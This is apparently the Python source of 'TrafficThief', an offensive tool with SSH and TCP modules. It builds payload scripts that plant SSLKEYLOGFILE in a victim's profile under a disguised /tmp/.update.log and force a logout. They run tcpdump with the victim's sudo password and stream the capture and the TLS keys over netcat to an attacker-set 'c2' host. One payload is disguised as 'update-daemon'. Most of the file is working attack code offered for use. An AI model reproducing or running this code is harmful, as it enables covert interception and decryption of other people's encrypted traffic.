import http
import socketserver
import sys
import time
import paramiko
from paramiko_expect import SSHClientInteraction
from http.server import SimpleHTTPRequestHandler
from riposte import Riposte
from riposte.printer import Palette
from utils import *


# DO A DEPENDENCY CHECK AT SOME POINT FOR dbus-x11
# Without it, the damn terminals will not automatically open on 22.04 ubuntu


class TrafficThief(Riposte):
    @property
    def prompt(self):
        if thief.module:
            return Palette.RED.format(f'trafficThief/{thief.module}:~ >> ')
        else:
            return self._prompt


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=staging_area, **kwargs)


install_directory = os.getcwd()
staging_area = f'{install_directory}/staging_area'

start_banner()

thief = Application()
repl = TrafficThief(prompt=Palette.RED.format('trafficThief:~ >> '))


use_subcommands = ["linux-ssh", "linux-tcp", "windows-ssh", "windows-tcp"]
tcp_subcommands = ['windows-tcp', 'linux-tcp']
ssh_subcommands = ['windows-ssh', 'linux-ssh']
options_subcommands = ['target', 'traffic-port', 'http-server-port', 'keylog-port', 'ssh-key', 'ssh-pw', 'ssh-user', 'c2']


def tcp_options():
    print('\nDefinitions:\n'
          '\n'
          '     c2                = IPv4 or IPv6 address you want to receive traffic\n'
          '     traffic-port      = Listening port for traffic\n'
          '     keylog-port       = Listening port for SSL/TLS keys\n'
          '     https-server-port = Port for staging_area HTTP server\n'
          '\n'
          '--------------------------------------------------------------------------------'
          '\n'
          '\nTarget Options:\n'
          '\n'
          '     Name                 Setting\n'
          '     ----                 -------\n'
          f'     c2                   {Palette.BLUE.format(thief.c2)}\n'
          f'     traffic-port         {Palette.BLUE.format(thief.traffic_port)}\n'
          f'     keylog-port          {Palette.BLUE.format(thief.keylog_port)}\n'
          f'     http-server-port     {Palette.BLUE.format(thief.http_server)}\n')


def ssh_options():
    print('\nDefinitions:\n'
          '\n'
          '     target   =          IPv4 or IPv6 address\n'
          '     ssh-user =          SSH username\n'
          '     ssh-key  =          Full path to SSH key (if applicable)\n'
          '     ssh-pw   =          SSH password (if applicable)\n'
          '\n'
          '--------------------------------------------------------------------------------'
          '\n'
          '\nTarget Options:\n'
          '\n'
          '     Name                 Setting\n'
          '     ----                 -------\n'
          f'     target               {Palette.BLUE.format(thief.target)}\n'
          f'     ssh-user             {Palette.BLUE.format(thief.ssh_user)}\n'
          f'     ssh-key              {Palette.BLUE.format(thief.ssh_keyloc)}\n'
          f'     ssh-pw               {Palette.BLUE.format(thief.ssh_password)}\n')


@repl.command('help')
def help_menus():
    """
    - Prints the main help menu for global commands
    - If a module is in use, shows help for that module
    """
    if thief.module == 'linux-tcp':
        tcp_help()
    elif thief.module == 'windows-tcp':
        tcp_help()
    elif thief.module == 'linux-ssh':
        ssh_help()
    elif thief.module == 'windows=ssh':
        ssh_help()
    else:
        global_help()


@repl.command('clear')
def clear_cli():
    """Resets the CLI."""
    os.system('clear')
    print(Palette.BLUE.format(f'{banner}'))


@repl.command('networking')
def networking():
    os.system('ip -br a')


@repl.command('exit')
def exit_cli():
    """Exits the program."""
    sys.exit()


@repl.command('http-on')
def http_on():
    port = int(thief.http_server)
    with socketserver.TCPServer(('', port), Handler) as httpd:
        httpd.serve_forever()
        repl.success(f'HTTP server on {thief.http_server}')


@repl.command('set')
def set_option(subcommand: str, setting: str):
    """Sets options for the selected module."""
    if subcommand in options_subcommands:
        if subcommand == 'target':
            thief.target = check_ip(setting)
            repl.success(f'target set to {thief.target}')
        if subcommand == 'c2':
            thief.c2 = setting
            repl.success(f'c2 IP address set to {thief.c2}')
        if subcommand == 'http-server-port':
            thief.http_server = check_port(setting)
            repl.success(f'HTTP server port is {thief.http_server}')
        if subcommand == 'traffic-port':
            thief.traffic_port = check_port(setting)
            repl.success(f'traffic-port set to {thief.traffic_port}')
        if subcommand == 'keylog-port':
            thief.keylog_port = check_port(setting)
            repl.success(f'keylog-port set to {thief.keylog_port}')
        if subcommand == "ssh-user":
            thief.ssh_user = setting
            repl.success(f'ssh-user set to {thief.ssh_user}')
        if subcommand == 'ssh-key':
            thief.ssh_keyloc = setting
            repl.success(f'ssh-user set to {thief.ssh_keyloc}')
        if subcommand == 'ssh-pw':
            thief.ssh_password = setting
            repl.success(f'ssh-pw set to {thief.ssh_password}')
    else:
        repl.error("Invalid entry")


@repl.complete('set')
def use_completer(text, line, start_index, end_index):
    return [
        subcommand
        for subcommand in options_subcommands
        if subcommand.startswith(text)
    ]


@repl.command('use')
def set_module(module_name: str):
    """Sets the module to use."""
    thief.module = module_name
    if thief.module == 'linux-ssh':
        repl.success(Palette.GREEN.format(f'{thief.module} is set!\n'))
    elif thief.module == 'linux-tcp':
        repl.success(Palette.GREEN.format(f'{thief.module} is set!\n'))
    elif thief.module == 'windows-ssh':
        # This command will go in later once the module is done
        # repl.success(Palette.GREEN.format(f'{thief.module} is set!\n'))
        print(Palette.YELLOW.format(f'[W] "{thief.module}" is not ready yet!\n'))
        thief.module = None
    elif thief.module == 'windows-tcp':
        # This command will go in later once the module is done
        # repl.success(Palette.GREEN.format(f'{thief.module} is set!\n'))
        print(Palette.YELLOW.format(f'[W] "{thief.module}" module is not ready yet!\n'))
        thief.module = None
    else:
        print(Palette.YELLOW.format(f'[W] "{thief.module}" is not a valid module!\n'))
        thief.module = None


@repl.complete('use')
def use_completer(text, line, start_index, end_index):
    return [
        module_name
        for module_name in use_subcommands
        if module_name.startswith(text)
    ]


@repl.command('unuse')
def unset_module():
    """Unsets the current module."""
    thief.module = None
    repl.success(Palette.GREEN.format(f'Module is unset!'))


@repl.command('show')
def show_command(subcommand: str):
    """
    - 'show modules' shows all available modules.
    - 'show options' shows available setup options for the selected module.
    """
    if subcommand == 'modules':
        show_modules()
    elif subcommand == 'options':
        # print(f'{thief.module}')
        if thief.module is None:
            print(Palette.YELLOW.format('[W] You must use a module...'))
            print(Palette.YELLOW.format('Ex.>> use <module name>'))
        elif thief.module in tcp_subcommands:
            tcp_options()
        elif thief.module in ssh_subcommands:
            ssh_options()
        else:
            print(Palette.YELLOW.format('[W] No module set...'))
    else:
        repl.status('Not a real option...')


def tcp_setup():
    """
    - Opens Wireshark on /tmp/loot pipe
    - Opens two netcat terminals to monitor the selected ports
    - Opens a terminal to monitor the SSL/TLS key log
    """
    # print(f'DEBUG MESSAGE FOR VARIABLES: {thief.c2} | {thief.traffic_port} | {thief.keylog_port}')
    os.system(f'gnome-terminal -- bash -c -i "nc -lvnp {thief.traffic_port} > /tmp/loot ; exec bash &"')
    os.system(f'gnome-terminal -- bash -c -i "nc -lvnp {thief.keylog_port} '
              f'>> $PWD/keyloot.log ; exec bash &"')
    os.system(f'gnome-terminal -- bash -c "tail -f {install_directory}/keyloot.log"')


def linssh_pw():
    sudo_pw = input(Palette.YELLOW.format("If required, enter the user's sudo password: "))
    with open('staging_area/lin-ssh', 'w') as payload:
        payload.write(f"""\
#!/bin/bash
sshpass -p {thief.ssh_password} ssh -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'touch /tmp/.update.log' &
sleep 3
sshpass -p {thief.ssh_password} ssh -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
sleep 3
sshpass -p {thief.ssh_password} ssh -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'gnome-session-quit --no-prompt' &
sleep 5
sshpass -p {thief.ssh_password} ssh -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'tail -f /tmp/.update.log' >> {install_directory}/keyloot.log &
sshpass -p {thief.ssh_password} ssh -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'echo "{sudo_pw}" | sudo -S tcpdump -s0 -U -n -w - not port 22' > /tmp/loot &
""")
        payload.close()
    os.system('chmod +x staging_area/lin-ssh')
    os.system(f'gnome-terminal -- tail -f {install_directory}/keyloot.log &')
    os.system(f'./staging_area/lin-ssh')


def linssh_rsa():
    sudo_pw = input(Palette.YELLOW.format("If required, enter the user's sudo password: "))
    with open('staging_area/lin-rsa', 'w') as payload:
        payload.write(f"""\
#!/bin/bash
ssh -i {thief.ssh_keyloc} -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} 'touch /tmp/.update.log' &
sleep 3
ssh -i {thief.ssh_keyloc} -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
sleep 3
ssh -i {thief.ssh_keyloc} -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'gnome-session-quit --no-prompt' &
sleep 5
ssh -i {thief.ssh_keyloc} -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'tail -f /tmp/.update.log' >> {install_directory}/keyloot.log &
ssh -i {thief.ssh_keyloc} -o StrictHostKeyChecking=no {thief.ssh_user}@{thief.target} \
'echo "{sudo_pw}" | sudo -S tcpdump -s0 -U -n -w - not port 22' > /tmp/loot &
""")
        payload.close()
    os.system('chmod +x staging_area/lin-rsa')
    os.system(f'gnome-terminal -- tail -f {install_directory}/keyloot.log &')
    os.system(f'./staging_area/lin-rsa')


def linux_ssh():
    if thief.ssh_password is None:
        linssh_rsa()
    elif thief.ssh_keyloc is None:
        linssh_pw()
    else:
        repl.error("Set a password or rsa key filepath...")


@repl.command('payload')
def tcp_payloads():
    if thief.module == 'linux-tcp':
        sudo_pw = input("What is the user's sudo password? (If required. Leave blank if not.): ")
        with open('staging_area/update-daemon', 'w') as payload:
            payload.write(f'''\
            #!/bin/bash
            touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile &
            sleep 5
            #gnome-session-quit --no-prompt
            #reset
            source ~/.profile
            echo "{sudo_pw}" | sudo -S tcpdump -s0 -U -n -w - | nc {thief.c2} {thief.traffic_port} &
            tail -f /tmp/.update.log | nc {thief.c2} {thief.keylog_port} &
            ''')
            payload.close()
        os.system(f'chmod 777 staging_area/update-daemon')
        repl.success('Payload is ready in staging_area...')
    elif thief.module == 'windows-tcp':
        # payload in progress
        pass
    else:
        repl.status('Do you have an active module?')


@repl.command('run')
def run_module():
    """Executes the current module with set options"""
    try:
        if thief.module is not None:
            dump_prep()
            time.sleep(3)
            start_wireshark()
            if thief.module == 'linux-tcp':
                tcp_setup()
            if thief.module == 'linux-ssh':
                linux_ssh()
        else:
            repl.error("No module selected...\n")
            pass

    except KeyboardInterrupt:
        repl.info("Stopping Everything...")


repl.run()
